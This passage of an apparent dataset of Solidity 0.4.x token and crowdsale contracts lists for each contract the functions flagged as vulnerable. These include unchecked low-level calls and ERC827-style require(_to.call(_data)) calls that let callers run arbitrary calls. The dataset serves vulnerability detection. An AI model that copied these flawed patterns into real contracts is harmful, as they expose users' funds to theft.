step.tokensSold.add(amount);\n steps[currentStep].collectedWei = step.collectedWei.add(sum);\n if(currentStep == 0) {\n canSell[msg.sender] = canSell[msg.sender].add(amount);\n }\n if(step.transferBalance) {\n uint p1 = sum.div(200);\n (0xD8C7f2215f90463c158E91b92D81f0A1E3187C1B).transfer(p1.mul(3));\n (0x8C8d80effb2c5C1E4D857e286822E0E641cA3836).transfer(p1.mul(3));\n beneficiary.transfer(sum.sub(p1.mul(6)));\n }\n token.mint(msg.sender, amount);\n if(retSum > 0) {\n msg.sender.transfer(retSum);\n }\n Purchase(msg.sender, amount, sum);\n }\n function sell(uint256 _value) whenNotPaused public {\n require(!crowdsaleClosed);\n require(canSell[msg.sender] >= _value);\n require(token.balanceOf(msg.sender) >= _value);\n Step memory step = steps[currentStep];\n require(step.sale);\n canSell[msg.sender] = canSell[msg.sender].sub(_value);\n token.call('transfer', beneficiary, _value);\n uint sum = _value.mul(step.priceTokenWei).div(1 ether);\n msg.sender.transfer(sum);\n Sell(msg.sender, _value, sum);\n }\n function nextStep(uint _value) onlyOwner public {\n require(!crowdsaleClosed);\n require(steps.length - 1 > currentStep);\n currentStep += 1;\n setTokenRate(_value);\n NextStep(currentStep);\n }\n function closeCrowdsale() onlyOwner public {\n require(!crowdsaleClosed);\n beneficiary.transfer(this.balance);\n token.mint(beneficiary, token.cap().sub(token.totalSupply()));\n token.transferOwnership(beneficiary);\n crowdsaleClosed = true;\n CrowdsaleClose();\n }\n}",
  "extract_feature": [
    "function sell(uint256 _value) whenNotPaused public {\nrequire(!crowdsaleClosed);\nrequire(canSell[msg.sender] >= _value);\nrequire(token.balanceOf(msg.sender) >= _value);\nStep memory step = steps[currentStep];\nrequire(step.sale);\ncanSell[msg.sender] = canSell[msg.sender].sub(_value);\ntoken.call('transfer', beneficiary, _value);\nuint sum = _value.mul(step.priceTokenWei).div(1 ether);\nmsg.sender.transfer(sum);\nSell(msg.sender, _value, sum);\n}"
  ]
},
{
  "_id": {
    "$oid": "663b8db5fcb296bdecdb1455"
  },
  "filename": "22901.sol",
  "content": "pragma solidity ^0.4.18;\ncontract Ownable {\n address public owner;\n event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);\n function Ownable() public {\n owner = msg.sender;\n }\n modifier onlyOwner() {\n require(msg.sender == owner);\n _;\n }\n function transferOwnership(address newOwner) public onlyOwner {\n require(newOwner != address(0));\n OwnershipTransferred(owner, newOwner);\n owner = newOwner;\n }\n}\ncontract BuildingStatus is Ownable {\n address public observer;\n address public crowdsale;\n enum statusEnum {\n crowdsale,\n refund,\n preparation_works,\n building_permit,\n design_technical_documentation,\n utilities_outsite,\n construction_residential,\n frame20,\n frame40,\n frame60,\n frame80,\n frame100,\n stage1,\n stage2,\n stage3,\n stage4,\n stage5,\n facades20,\n facades40,\n facades60,\n facades80,\n facades100,\n engineering,\n finishing,\n construction_parking,\n civil_works,\n engineering_further,\n commisioning_project,\n completed\n }\n modifier notCompleted() {\n require(status != statusEnum.completed);\n _;\n }\n modifier onlyObserver() {\n require(msg.sender == observer || msg.sender == owner || msg.sender == address(this));\n _;\n }\n modifier onlyCrowdsale() {\n require(msg.sender == crowdsale || msg.sender == owner || msg.sender == address(this));\n _;\n }\n statusEnum public status;\n event StatusChanged(statusEnum newStatus);\n function setStatus(statusEnum newStatus) onlyCrowdsale public {\n status = newStatus;\n StatusChanged(newStatus);\n }\n function changeStage(uint8 stage) public onlyObserver {\n if (stage==1) status = statusEnum.stage1;\n if (stage==2) status = statusEnum.stage2;\n if (stage==3) status = statusEnum.stage3;\n if (stage==4) status = statusEnum.stage4;\n if (stage==5) status = statusEnum.stage5;\n }\n}\ncontract PermissionManager is Ownable {\n mapping (address => bool) permittedAddresses;\n function addAddress(address newAddress) public onlyOwner {\n permittedAddresses[newAddress] = true;\n }\n function removeAddress(address remAddress) public onlyOwner {\n permittedAddresses[remAddress] = false;\n }\n function isPermitted(address pAddress) public view returns(bool) {\n if (permittedAddresses[pAddress]) {\n return true;\n }\n return false;\n }\n}\ncontract ERC223Interface {\n uint public totalSupply;\n function balanceOf(address who) public view returns (uint);\n function allowedAddressesOf(address who) public view returns (bool);\n function getTotalSupply() public view returns (uint);\n function transfer(address to, uint value) public returns (bool ok);\n function transfer(address to, uint value, bytes data) public returns (bool ok);\n function transfer(address to, uint value, bytes data, string custom_fallback) public returns (bool ok);\n event Transfer(address indexed from, address indexed to, uint value, bytes data);\n event TransferContract(address indexed from, address indexed to, uint value, bytes data);\n}\ncontract Object is BuildingStatus {\n string public name;\n uint32 public gba;\n uint32 public gla;\n uint32 public parking;\n enum unitEnum {appartment, residential}\n unitEnum public unit;\n string public developer;\n string public leed;\n string public location;\n uint public constructionStart;\n uint public constructionEnd;\n uint public untsqm;\n string public report;\n event ConstructionDateChanged(uint constructStart, uint constructEnd);\n event PropertyChanged(uint32 gba, uint32 gla, uint32 parking, unitEnum unit, string developer,\n string leed, string location, uint constructionStart, uint constructionEnd);\n event HoldChanged(address newHold);\n event ObserverChanged(address newObserver);\n event CrowdsaleChanged(address newCrowdsale);\n event TokenChanged(address newCrowdsale);\n ERC223Interface public token;\n address public hold;\n PermissionManager public permissionManager;\n modifier onlyPermitted() {\n require(permissionManager.isPermitted(msg.sender) || msg.sender == owner || msg.sender == address(this));\n _;\n }\n event Completed(string report);\n function Object(string iName, uint32 iGBA, uint32 iGSA, uint32 iParking, unitEnum iUnit,\n string iDeveloper, string iLeed, string iLocation, uint iStartDate, uint iEndDate, uint UNTSQM,\n address iToken, address iCrowdsale, address iObserver, address iHold, address pManager) public {\n name = iName;\n gba = iGBA;\n gla = iGSA;\n parking = iParking;\n unit = iUnit;\n developer = iDeveloper;\n leed = iLeed;\n location = iLocation;\n untsqm = UNTSQM;\n constructionStart = iStartDate;\n constructionEnd = iEndDate;\n token = ERC223Interface(iToken);\n crowdsale = iCrowdsale;\n observer = iObserver;\n hold = iHold;\n permissionManager = PermissionManager(pManager);\n }\n function setPermissionManager(address _permadr) public onlyOwner {\n require(_permadr != 0x0);\n permissionManager = PermissionManager(_permadr);\n }\n function setGBA(uint32 newGBA) public onlyPermitted notCompleted {\n gba = newGBA;\n PropertyChanged(gba, gla, parking, unit, developer, leed, location, constructionStart, constructionEnd);\n }\n function setGLA(uint32 newGLA) public onlyPermitted notCompleted {\n gla = newGLA;\n PropertyChanged(gba, gla, parking, unit, developer, leed, location, constructionStart, constructionEnd);\n }\n function setParking(uint32 newParking) public onlyPermitted notCompleted {\n parking = newParking;\n PropertyChanged(gba, gla, parking, unit, developer, leed, location, constructionStart, constructionEnd);\n }\n function setUnit(unitEnum newUnit) public onlyPermitted notCompleted {\n unit = newUnit;\n PropertyChanged(gba, gla, parking, unit, developer, leed, location, constructionStart, constructionEnd);\n }\n function setDeveloper(string newDeveloper) public onlyPermitted notCompleted {\n developer = newDeveloper;\n PropertyChanged(gba, gla, parking, unit, developer, leed, location, constructionStart, constructionEnd);\n }\n function setLeed(string newLeed) public onlyPermitted notCompleted {\n leed = newLeed;\n PropertyChanged(gba, gla, parking, unit, developer, leed, location, constructionStart, constructionEnd);\n }\n function setLocation(string newLocation) public onlyPermitted notCompleted {\n location = newLocation;\n PropertyChanged(gba, gla, parking, unit, developer, leed, location, constructionStart, constructionEnd);\n }\n function setStartDate(uint newStartDate) public onlyPermitted notCompleted {\n constructionStart = newStartDate;\n PropertyChanged(gba, gla, parking, unit, developer, leed, location, constructionStart, constructionEnd);\n }\n function setEndDate(uint newEndDate) public onlyPermitted notCompleted {\n constructionEnd = newEndDate;\n PropertyChanged(gba, gla, parking, unit, developer, leed, location, constructionStart, constructionEnd);\n }\n function setName(string _name) public onlyPermitted notCompleted {\n name = _name;\n PropertyChanged(gba, gla, parking, unit, developer, leed, location, constructionStart, constructionEnd);\n }\n function setUntsqm(uint _untsqm) public onlyPermitted notCompleted {\n untsqm = _untsqm;\n PropertyChanged(gba, gla, parking, unit, developer, leed, location, constructionStart, constructionEnd);\n }\n function setObserver(address _observer) public onlyOwner {\n require(_observer != 0x0);\n observer = _observer;\n ObserverChanged(_observer);\n }\n function setToken(address _token) public onlyOwner {\n require(_token != 0x0);\n token = ERC223Interface(_token);\n TokenChanged(_token);\n }\n function setHold(address _hold) public onlyOwner {\n require(_hold != 0x0);\n hold = _hold;\n HoldChanged(_hold);\n }\n function setCrowdsale(address _crowdsale) public onlyOwner {\n require(_crowdsale != 0x0);\n crowdsale = _crowdsale;\n CrowdsaleChanged(_crowdsale);\n }\n function getTotalSupply() public view returns (uint) {\n return token.getTotalSupply();\n }\n function getUNTSQM() public view returns (uint) {\n return untsqm;\n }\n function setProperty(string property, string typeArg, uint intVal, string strVal) public onlyObserver {\n string memory set = \"set\";\n string memory s = \"(\";\n string memory s2 = \")\";\n bytes memory _ba = bytes(set);\n bytes memory _bb = bytes(property);\n bytes memory _t = bytes(typeArg);\n bytes memory _s = bytes(s);\n bytes memory _s2 = bytes(s2);\n string memory ab = new string(_ba.length + _bb.length + 1 + _t.length + 1);\n bytes memory babcde = bytes(ab);\n uint k = 0;\n for (uint i = 0; i < _ba.length; i++) {\n babcde[k++] = _ba[i];\n }\n for (i = 0; i < _bb.length; i++) {\n babcde[k++] = _bb[i];\n }\n babcde[k++] = _s[0];\n for (i = 0; i < _t.length; i++) {\n babcde[k++] = _t[i];\n }\n babcde[k++] = _s2[0];\n if (intVal == 0) {\n assert(this.call(bytes4(keccak256(string(babcde))), strVal));\n } else {\n assert(this.call(bytes4(keccak256(string(babcde))), intVal));\n }\n }\n function completeStatus(string newReport) public onlyOwner notCompleted {\n status = statusEnum.completed;\n report = newReport;\n Completed(report);\n }\n}",
  "extract_feature": [
    "function setProperty(string property, string typeArg, uint intVal, string strVal) public onlyObserver {\nstring memory set = \"set\";\nstring memory s = \"(\";\nstring memory s2 = \")\";\nbytes memory _ba = bytes(set);\nbytes memory _bb = bytes(property);\nbytes memory _t = bytes(typeArg);\nbytes memory _s = bytes(s);\nbytes memory _s2 = bytes(s2);\nstring memory ab = new string(_ba.length + _bb.length + 1 + _t.length + 1);\nbytes memory babcde = bytes(ab);\nuint k = 0;\nfor (uint i = 0; i < _ba.length; i++) {\nbabcde[k++] = _ba[i];\n}\nfor (i = 0; i < _bb.length; i++) {\nbabcde[k++] = _bb[i];\n}\nbabcde[k++] = _s[0];\nfor (i = 0; i < _t.length; i++) {\nbabcde[k++] = _t[i];\n}\nbabcde[k++] = _s2[0];\nif (intVal == 0) {\nassert(this.call(bytes4(keccak256(string(babcde))), strVal));\n} else {\nassert(this.call(bytes4(keccak256(string(babcde))), intVal));\n}\n}"
  ]
},
{
  "_id": {
    "$oid": "663b8db5fcb296bdecdb1456"
  },
  "filename": "23126.sol",
  "content": "pragma solidity ^0.4.10;\ncontract GasToken2 {\n uint256 constant ADDRESS_BYTES = 20;\n uint256 constant MAX_SINGLE_BYTE = 128;\n uint256 constant MAX_NONCE = 256**9 - 1;\n function count_bytes(uint256 n) constant internal returns (uint256 c) {\n uint i = 0;\n uint mask = 1;\n while (n >= mask) {\n i += 1;\n mask *= 256;\n }\n return i;\n }\n function mk_contract_address(address a, uint256 n) constant internal returns (address rlp) {\n require(n <= MAX_NONCE);\n uint256 nonce_bytes;\n uint256 nonce_rlp_len;\n if (0 < n && n < MAX_SINGLE_BYTE) {\n nonce_bytes = 1;\n nonce_rlp_len = 1;\n } else {\n nonce_bytes = count_bytes(n);\n nonce_rlp_len = nonce_bytes + 1;\n }\n uint256 tot_bytes = 1 + ADDRESS_BYTES + nonce_rlp_len;\n uint256 word = ((192 + tot_bytes) * 256**31) +\n ((128 + ADDRESS_BYTES) * 256**30) +\n (uint256(a) * 256**10);\n if (0 < n && n < MAX_SINGLE_BYTE) {\n word += n * 256**9;\n } else {\n word += (128 + nonce_bytes) * 256**9;\n word += n * 256**(9 - nonce_bytes);\n }\n uint256 hash;\n assembly {\n let mem_start := mload(0x40)\n mstore(0x40, add(mem_start, 0x20))\n mstore(mem_start, word)\n hash := sha3(mem_start,\n add(tot_bytes, 1))\n }\n return address(hash);\n }\n mapping(address => uint256) s_balances;\n mapping(address => mapping(address => uint256)) s_allowances;\n event Transfer(address indexed from, address indexed to, uint256 value);\n event Approval(address indexed owner, address indexed spender, uint256 value);\n function balanceOf(address owner) public constant returns (uint256 balance) {\n return s_balances[owner];\n }\n function internalTransfer(address from, address to, uint256 value) internal returns (bool success) {\n if (value <= s_balances[from]) {\n s_balances[from] -= value;\n s_balances[to] += value;\n Transfer(from, to, value);\n return true;\n } else {\n return false;\n }\n }\n function transfer(address to, uint256 value) public returns (bool success) {\n address from = msg.sender;\n return internalTransfer(from, to, value);\n }\n function transferFrom(address from, address to, uint256 value) public returns (bool success) {\n address spender = msg.sender;\n if(value <= s_allowances[from][spender] && internalTransfer(from, to, value)) {\n s_allowances[from][spender] -= value;\n return true;\n } else {\n return false;\n }\n }\n function approve(address spender, uint256 value) public returns (bool success) {\n address owner = msg.sender;\n if (value != 0 && s_allowances[owner][spender] != 0) {\n return false;\n }\n s_allowances[owner][spender] = value;\n Approval(owner, spender, value);\n return true;\n }\n function allowance(address owner, address spender) public constant returns (uint256 remaining) {\n return s_allowances[owner][spender];\n }\n uint8 constant public decimals = 2;\n string constant public name = \"Gastoken.io\";\n string constant public symbol = \"GST2\";\n uint256 s_head;\n uint256 s_tail;\n function totalSupply() public constant returns (uint256 supply) {\n return s_head - s_tail;\n }\n function makeChild() internal returns (address addr) {\n assembly {\n let solidity_free_mem_ptr := mload(0x40)\n mstore(solidity_free_mem_ptr, 0x00756eb3f879cb30fe243b4dfee438691c043318585733ff6000526016600af3)\n addr := create(0, add(solidity_free_mem_ptr, 1), 31)\n }\n }\n function mint(uint256 value) public {\n for (uint256 i = 0; i < value; i++) {\n makeChild();\n }\n s_head += value;\n s_balances[msg.sender] += value;\n }\n function destroyChildren(uint256 value) internal {\n uint256 tail = s_tail;\n for (uint256 i = tail + 1; i <= tail + value; i++) {\n mk_contract_address(this, i).call();\n }\n s_tail = tail + value;\n }\n function free(uint256 value) public returns (bool success) {\n uint256 from_balance = s_balances[msg.sender];\n if (value > from_balance) {\n return false;\n }\n destroyChildren(value);\n s_balances[msg.sender] = from_balance - value;\n return true;\n }\n function freeUpTo(uint256 value) public returns (uint256 freed) {\n uint256 from_balance = s_balances[msg.sender];\n if (value > from_balance) {\n value = from_balance;\n }\n destroyChildren(value);\n s_balances[msg.sender] = from_balance - value;\n return value;\n }\n function freeFrom(address from, uint256 value) public returns (bool success) {\n address spender = msg.sender;\n uint256 from_balance = s_balances[from];\n if (value > from_balance) {\n return false;\n }\n mapping(address => uint256) from_allowances = s_allowances[from];\n uint256 spender_allowance = from_allowances[spender];\n if (value > spender_allowance) {\n return false;\n }\n destroyChildren(value);\n s_balances[from] = from_balance - value;\n from_allowances[spender] = spender_allowance - value;\n return true;\n }\n function freeFromUpTo(address from, uint256 value) public returns (uint256 freed) {\n address spender = msg.sender;\n uint256 from_balance = s_balances[from];\n if (value > from_balance) {\n value = from_balance;\n }\n mapping(address => uint256) from_allowances = s_allowances[from];\n uint256 spender_allowance = from_allowances[spender];\n if (value > spender_allowance) {\n value = spender_allowance;\n }\n destroyChildren(value);\n s_balances[from] = from_balance - value;\n from_allowances[spender] = spender_allowance - value;\n return value;\n }\n}",
  "extract_feature": [
    "function destroyChildren(uint256 value) internal {\nuint256 tail = s_tail;\nfor (uint256 i = tail + 1; i <= tail + value; i++) {\nmk_contract_address(this, i).call();\n}\ns_tail = tail + value;\n}"
  ]
},
{
  "_id": {
    "$oid": "663b8db5fcb296bdecdb1457"
  },
  "filename": "239.sol",
  "content": "pragma solidity ^0.4.4;\ncontract Token {\n function totalSupply() constant returns (uint256 supply) {}\n function balanceOf(address _owner) constant returns (uint256 balance) {}\n function transfer(address _to, uint256 _value) returns (bool success) {}\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {}\n function approve(address _spender, uint256 _value) returns (bool success) {}\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {}\n event Transfer(address indexed _from, address indexed _to, uint256 _value);\n event Approval(address indexed _owner, address indexed _spender, uint256 _value);\n}\ncontract StandardToken is Token {\n function transfer(address _to, uint256 _value) returns (bool success) {\n if (balances[msg.sender] >= _value && _value > 0) {\n balances[msg.sender] -= _value;\n balances[_to] += _value;\n Transfer(msg.sender, _to, _value);\n return true;\n } else { return false; }\n }\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {\n if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && _value > 0) {\n balances[_to] += _value;\n balances[_from] -= _value;\n allowed[_from][msg.sender] -= _value;\n Transfer(_from, _to, _value);\n return true;\n } else { return false; }\n }\n function balanceOf(address _owner) constant returns (uint256 balance) {\n return balances[_owner];\n }\n function approve(address _spender, uint256 _value) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n return true;\n }\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {\n return allowed[_owner][_spender];\n }\n mapping (address => uint256) balances;\n mapping (address => mapping (address => uint256)) allowed;\n uint256 public totalSupply;\n}\ncontract WellnessToken is StandardToken {\n string public name;\n uint8 public decimals;\n string public symbol;\n string public version = 'H1.0';\n uint256 public WellnessToken ;\n uint256 public totalEthInWei;\n address fundsWallet;\n function WellnessToken() {\n balances[msg.sender] = 7600000000000000000000000000;\n totalSupply = 7600000000000000000000000000;\n name = \"WellnessToken\";\n decimals = 18;\n symbol = \"WELL\";\n fundsWallet = msg.sender;\n }\n function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n if(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\n return true;\n }\n}",
  "extract_feature": [
    "function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\nallowed[msg.sender][_spender] = _value;\nApproval(msg.sender, _spender, _value);\nif(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\nreturn true;\n}"
  ]
},
{
  "_id": {
    "$oid": "663b8db5fcb296bdecdb1458"
  },
  "filename": "24624.sol",
  "content": "pragma solidity ^0.4.19;\nlibrary SafeMath {\n function mul(uint256 a, uint256 b) internal pure returns (uint256) {\n if (a == 0) {\n return 0;\n }\n uint256 c = a * b;\n assert(c / a == b);\n return c;\n }\n function div(uint256 a, uint256 b) internal pure returns (uint256) {\n uint256 c = a / b;\n return c;\n }\n function sub(uint256 a, uint256 b) internal pure returns (uint256) {\n assert(b <= a);\n return a - b;\n }\n function add(uint256 a, uint256 b) internal pure returns (uint256) {\n uint256 c = a + b;\n assert(c >= a);\n return c;\n }\n}\ncontract Ownable {\n address public owner;\n event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);\n function Ownable() public {\n owner = msg.sender;\n }\n modifier onlyOwner() {\n require(msg.sender == owner);\n _;\n }\n function transferOwnership(address newOwner) public onlyOwner {\n require(newOwner != address(0));\n OwnershipTransferred(owner, newOwner);\n owner = newOwner;\n }\n}\ncontract ERC20Interface {\n function totalSupply() public constant returns (uint);\n function balanceOf(address tokenOwner) public constant returns (uint balance);\n function allowance(address tokenOwner, address spender) public constant returns (uint remaining);\n function transfer(address to, uint tokens) public returns (bool success);\n function approve(address spender, uint tokens) public returns (bool success);\n function transferFrom(address from, address to, uint tokens) public returns (bool success);\n event Transfer(address indexed from, address indexed to, uint tokens);\n event Approval(address indexed tokenOwner, address indexed spender, uint tokens);\n}\ncontract ERC827 {\n function approve( address _spender, uint256 _value, bytes _data ) public returns (bool);\n function transfer( address _to, uint256 _value, bytes _data ) public returns (bool);\n function transferFrom( address _from, address _to, uint256 _value, bytes _data ) public returns (bool);\n}\ncontract TEFoodsToken is Ownable, ERC20Interface {\n using SafeMath for uint;\n string public constant name = \"TE-FOOD\";\n string public constant symbol = \"TFD\";\n uint8 public constant decimals = 18;\n uint constant _totalSupply = 1000000000 * 1 ether;\n uint public transferrableTime = 9999999999;\n uint _vestedSupply;\n uint _circulatingSupply;\n mapping (address => uint) balances;\n mapping (address => mapping(address => uint)) allowed;\n struct vestedBalance {\n address addr;\n uint balance;\n }\n mapping (uint => vestedBalance[]) vestingMap;\n function TEFoodsToken () public {\n owner = msg.sender;\n balances[0x00] = _totalSupply;\n }\n event VestedTokensReleased(address to, uint amount);\n function allocateTokens (address addr, uint amount) public onlyOwner returns (bool) {\n require (addr != 0x00);\n require (amount > 0);\n balances[0x00] = balances[0x00].sub(amount);\n balances[addr] = balances[addr].add(amount);\n _circulatingSupply = _circulatingSupply.add(amount);\n assert (_vestedSupply.add(_circulatingSupply).add(balances[0x00]) == _totalSupply);\n Transfer(0x00, addr, amount);\n return true;\n }\n function allocateVestedTokens (address addr, uint amount, uint vestingPeriod) public onlyOwner returns (bool) {\n require (addr != 0x00);\n require (amount > 0);\n require (vestingPeriod > 0);\n balances[0x00] = balances[0x00].sub(amount);\n vestingMap[vestingPeriod].push( vestedBalance (addr,amount) );\n _vestedSupply = _vestedSupply.add(amount);\n assert (_vestedSupply.add(_circulatingSupply).add(balances[0x00]) == _totalSupply);\n return true;\n }\n function releaseVestedTokens (uint vestingPeriod) public {\n require (now >= transferrableTime.add(vestingPeriod));\n require (vestingMap[vestingPeriod].length > 0);\n require (vestingMap[vestingPeriod][0].balance > 0);\n var v = vestingMap[vestingPeriod];\n for (uint8 i = 0; i < v.length; i++) {\n balances[v[i].addr] = balances[v[i].addr].add(v[i].balance);\n _circulatingSupply = _circulatingSupply.add(v[i].balance);\n _vestedSupply = _vestedSupply.sub(v[i].balance);\n VestedTokensReleased(v[i].addr, v[i].balance);\n Transfer(0x00, v[i].addr, v[i].balance);\n v[i].balance = 0;\n }\n }\n function enableTransfers () public onlyOwner returns (bool) {\n transferrableTime = now.add(86400);\n owner = 0x00;\n return true;\n }\n function () public payable {\n revert();\n }\n function totalSupply() public constant returns (uint) {\n return _circulatingSupply;\n }\n function balanceOf(address tokenOwner) public constant returns (uint balance) {\n return balances[tokenOwner];\n }\n function vestedBalanceOf(address tokenOwner, uint vestingPeriod) public constant returns (uint balance) {\n var v = vestingMap[vestingPeriod];\n for (uint8 i = 0; i < v.length; i++) {\n if (v[i].addr == tokenOwner) return v[i].balance;\n }\n return 0;\n }\n function allowance(address tokenOwner, address spender) public constant returns (uint remaining) {\n return allowed[tokenOwner][spender];\n }\n function transfer(address to, uint tokens) public returns (bool success) {\n require (now >= transferrableTime);\n require (to != address(this));\n require (balances[msg.sender] >= tokens);\n balances[msg.sender] = balances[msg.sender].sub(tokens);\n balances[to] = balances[to].add(tokens);\n Transfer(msg.sender, to, tokens);\n return true;\n }\n function approve(address spender, uint tokens) public returns (bool success) {\n require (now >= transferrableTime);\n require (spender != address(this));\n allowed[msg.sender][spender] = tokens;\n Approval(msg.sender, spender, tokens);\n return true;\n }\n function transferFrom(address from, address to, uint tokens) public returns (bool success) {\n require (now >= transferrableTime);\n require (to != address(this));\n require (allowed[from][msg.sender] >= tokens);\n balances[from] = balances[from].sub(tokens);\n allowed[from][msg.sender] = allowed[from][msg.sender].sub(tokens);\n balances[to] = balances[to].add(tokens);\n Transfer(from, to, tokens);\n return true;\n }\n}\ncontract TEFoods827Token is TEFoodsToken, ERC827 {\n function approve(address _spender, uint256 _value, bytes _data) public returns (bool) {\n super.approve(_spender, _value);\n require(_spender.call(_data));\n return true;\n }\n function transfer(address _to, uint256 _value, bytes _data) public returns (bool) {\n super.transfer(_to, _value);\n require(_to.call(_data));\n return true;\n }\n function transferFrom(address _from, address _to, uint256 _value, bytes _data) public returns (bool) {\n super.transferFrom(_from, _to, _value);\n require(_to.call(_data));\n return true;\n }\n}",
  "extract_feature": [
    "function approve(address _spender, uint256 _value, bytes _data) public returns (bool) {\nsuper.approve(_spender, _value);\nrequire(_spender.call(_data));\nreturn true;\n}",
    "function transfer(address _to, uint256 _value, bytes _data) public returns (bool) {\nsuper.transfer(_to, _value);\nrequire(_to.call(_data));\nreturn true;\n}",
    "function transferFrom(address _from, address _to, uint256 _value, bytes _data) public returns (bool) {\nsuper.transferFrom(_from, _to, _value);\nrequire(_to.call(_data));\nreturn true;\n}"
  ]
},
{
  "_id": {
    "$oid": "663b8db5fcb296bdecdb1459"
  },
  "filename": "24822.sol",
  "content": "pragma solidity ^0.4.18;\ncontract ERC20Basic {\n function totalSupply() public view returns (uint256);\n function balanceOf(address who) public view returns (uint256);\n function transfer(address to, uint256 value) public returns (bool);\n event Transfer(address indexed from, address indexed to, uint256 value);\n}\ncontract ERC20 is ERC20Basic {\n function allowance(address owner, address spender) public view returns (uint256);\n function transferFrom(address from, address to, uint256 value) public returns (bool);\n function approve(address spender, uint256 value) public returns (bool);\n event Approval(address indexed owner, address indexed spender, uint256 value);\n}\ncontract ERC827 is ERC20 {\n function approve( address _spender, uint256 _value, bytes _data ) public returns (bool);\n function transfer( address _to, uint256 _value, bytes _data ) public returns (bool);\n function transferFrom( address _from, address _to, uint256 _value, bytes _data ) public returns (bool);\n}\nlibrary SafeERC20 {\n function safeTransfer(ERC20Basic token, address to, uint256 value) internal {\n assert(token.transfer(to, value));\n }\n function safeTransferFrom(ERC20 token, address from, address to, uint256 value) internal {\n assert(token.transferFrom(from, to, value));\n }\n function safeApprove(ERC20 token, address spender, uint256 value) internal {\n assert(token.approve(spender, value));\n }\n}\nlibrary SafeMath {\n function mul(uint256 a, uint256 b) internal pure returns (uint256) {\n if (a == 0) {\n return 0;\n }\n uint256 c = a * b;\n assert(c / a == b);\n return c;\n }\n function div(uint256 a, uint256 b) internal pure returns (uint256) {\n uint256 c = a / b;\n return c;\n }\n function sub(uint256 a, uint256 b) internal pure returns (uint256) {\n assert(b <= a);\n return a - b;\n }\n function add(uint256 a, uint256 b) internal pure returns (uint256) {\n uint256 c = a + b;\n assert(c >= a);\n return c;\n }\n}\ncontract Ownable {\n address public owner;\n event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);\n function Ownable() public {\n owner = msg.sender;\n }\n modifier onlyOwner() {\n require(msg.sender == owner);\n _;\n }\n function transferOwnership(address newOwner) public onlyOwner {\n require(newOwner != address(0));\n OwnershipTransferred(owner, newOwner);\n owner = newOwner;\n }\n}\ncontract HasNoEther is Ownable {\n function HasNoEther() public payable {\n require(msg.value == 0);\n }\n function() external {\n }\n function reclaimEther() external onlyOwner {\n assert(owner.send(this.balance));\n }\n}\ncontract HasNoContracts is Ownable {\n function reclaimContract(address contractAddr) external onlyOwner {\n Ownable contractInst = Ownable(contractAddr);\n contractInst.transferOwnership(owner);\n }\n}\ncontract CanReclaimToken is Ownable {\n using SafeERC20 for ERC20Basic;\n function reclaimToken(ERC20Basic token) external onlyOwner {\n uint256 balance = token.balanceOf(this);\n token.safeTransfer(owner, balance);\n }\n}\ncontract HasNoTokens is CanReclaimToken {\n function tokenFallback(address from_, uint256 value_, bytes data_) pure external {\n from_;\n value_;\n data_;\n revert();\n }\n}\ncontract NoOwner is HasNoEther, HasNoTokens, HasNoContracts {\n}\ncontract BasicToken is ERC20Basic {\n using SafeMath for uint256;\n mapping(address => uint256) balances;\n uint256 totalSupply_;\n function totalSupply() public view returns (uint256) {\n return totalSupply_;\n }\n function transfer(address _to, uint256 _value) public returns (bool) {\n require(_to != address(0));\n require(_value <= balances[msg.sender]);\n balances[msg.sender] = balances[msg.sender].sub(_value);\n balances[_to] = balances[_to].add(_value);\n Transfer(msg.sender, _to, _value);\n return true;\n }\n function balanceOf(address _owner) public view returns (uint256 balance) {\n return balances[_owner];\n }\n}\ncontract StandardToken is ERC20, BasicToken {\n mapping (address => mapping (address => uint256)) internal allowed;\n function transferFrom(address _from, address _to, uint256 _value) public returns (bool) {\n require(_to != address(0));\n require(_value <= balances[_from]);\n require(_value <= allowed[_from][msg.sender]);\n balances[_from] = balances[_from].sub(_value);\n balances[_to] = balances[_to].add(_value);\n allowed[_from][msg.sender] = allowed[_from][msg.sender].sub(_value);\n Transfer(_from, _to, _value);\n return true;\n }\n function approve(address _spender, uint256 _value) public returns (bool) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n return true;\n }\n function allowance(address _owner, address _spender) public view returns (uint256) {\n return allowed[_owner][_spender];\n }\n function increaseApproval(address _spender, uint _addedValue) public returns (bool) {\n allowed[msg.sender][_spender] = allowed[msg.sender][_spender].add(_addedValue);\n Approval(msg.sender, _spender, allowed[msg.sender][_spender]);\n return true;\n }\n function decreaseApproval(address _spender, uint _subtractedValue) public returns (bool) {\n uint oldValue = allowed[msg.sender][_spender];\n if (_subtractedValue > oldValue) {\n allowed[msg.sender][_spender] = 0;\n } else {\n allowed[msg.sender][_spender] = oldValue.sub(_subtractedValue);\n }\n Approval(msg.sender, _spender, allowed[msg.sender][_spender]);\n return true;\n }\n}\ncontract MintableToken is StandardToken, Ownable {\n event Mint(address indexed to, uint256 amount);\n event MintFinished();\n bool public mintingFinished = false;\n modifier canMint() {\n require(!mintingFinished);\n _;\n }\n function mint(address _to, uint256 _amount) onlyOwner canMint public returns (bool) {\n totalSupply_ = totalSupply_.add(_amount);\n balances[_to] = balances[_to].add(_amount);\n Mint(_to, _amount);\n Transfer(address(0), _to, _amount);\n return true;\n }\n function finishMinting() onlyOwner canMint public returns (bool) {\n mintingFinished = true;\n MintFinished();\n return true;\n }\n}\ncontract ERC827Token is ERC827, StandardToken {\n function approve(address _spender, uint256 _value, bytes _data) public returns (bool) {\n require(_spender != address(this));\n super.approve(_spender, _value);\n require(_spender.call(_data));\n return true;\n }\n function transfer(address _to, uint256 _value, bytes _data) public returns (bool) {\n 